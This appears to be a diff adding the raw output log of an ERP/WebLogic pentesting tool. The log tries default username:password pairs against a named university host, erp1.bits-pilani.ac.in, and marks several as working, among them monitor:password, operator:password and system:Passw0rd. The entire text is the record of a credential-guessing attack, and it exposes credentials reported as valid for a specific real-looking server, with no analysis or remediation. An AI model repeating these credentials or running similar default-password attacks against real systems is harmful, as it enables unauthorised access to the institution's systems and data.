@@ -1,0 +1,25 @@
+
+
+ERPSCAN Pentesting tool v1.0
+
+by ERPScan (c) 2013
+
+
+Target: erp1.bits-pilani.ac.in:4431 with https
+
+
+system:password - wrong!
+
+monitor:password - OK!
+
+operator:password - OK!
+
+system:Passw0rd - OK!
+
+monitor:Passw0rd - wrong!
+
+operator:Passw0rd - wrong!
+
+weblogic:weblogic - wrong!
+
+weblogic:welcome1 - wrong!
